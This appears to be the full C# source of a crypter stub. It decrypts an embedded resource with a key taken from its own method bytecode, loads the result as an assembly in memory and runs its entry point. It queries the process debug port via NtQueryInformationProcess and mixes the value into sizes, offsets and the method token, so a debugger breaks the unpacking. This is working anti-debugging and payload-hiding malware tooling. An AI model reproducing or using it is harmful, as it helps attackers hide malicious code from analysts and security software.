using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Stub
{
    internal static class Program
    {
        [DllImport( "ntdll.dll", SetLastError = true, ExactSpelling = true )]
        private static extern int NtQueryInformationProcess( [In] IntPtr processHandle,
            [In] int processInformationClass, out IntPtr processInformation, [In] int processInformationLength,
            [Optional] out int returnLength );

        [STAThread]
        static void Main()
        {
            var debugPort = new IntPtr( 0 );
            var module = new StackTrace().GetFrame( 0 ).GetMethod().Module;
            NtQueryInformationProcess( Process.GetCurrentProcess().Handle, 7, out debugPort,
                Marshal.SizeOf( debugPort ), out _ );
            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream( "Name_Resource" );
            var data = new byte[stream.Length + debugPort.ToInt32()];
            stream.Read( data, 0 + debugPort.ToInt32(), data.Length + debugPort.ToInt32() );
            NtQueryInformationProcess( Process.GetCurrentProcess().Handle, 7, out debugPort,
                Marshal.SizeOf( debugPort ), out _ );
            var key = module.Assembly.ManifestModule.ResolveMethod( 123456789 + debugPort.ToInt32() ).GetMethodBody()
                ?.GetILAsByteArray();
            data = Decrypt( data, key );
            var asm = Assembly.Load( data );
            NtQueryInformationProcess( Process.GetCurrentProcess().Handle, 7, out debugPort,
                Marshal.SizeOf( debugPort ), out _ );
            var method = asm.EntryPoint;
            var obj = asm.CreateInstance( method.ToString() );
            method.Invoke( obj, null );
        }

        private static byte[] Decrypt( byte[] plain, byte[] key )
        {
            for ( var round = 0; round < 5; round++ )
            {
                for ( var i = 0; i < plain.Length; i++ )
                {
                    plain[i] = (byte) ( plain[i] ^ key[i % key.Length] );
                    for ( var k = 0; k < key.Length; k++ )
                        plain[i] = (byte) ( plain[i] ^ ( ( ( ( key[k] << round ) ^ k ) + i ) ) );
                }
            }

            return plain;
        }
        
        //Unused method however dont know if it will be used in the future
        private static byte[] Decompress( byte[] data )
        {
            using (var origin = new MemoryStream(data))
            using ( var destination = new MemoryStream() )
            using ( var deflateStream = new DeflateStream( origin, CompressionMode.Decompress ) )
            {
                deflateStream.CopyTo( destination );
                return destination.ToArray();
            }
        }
    }
}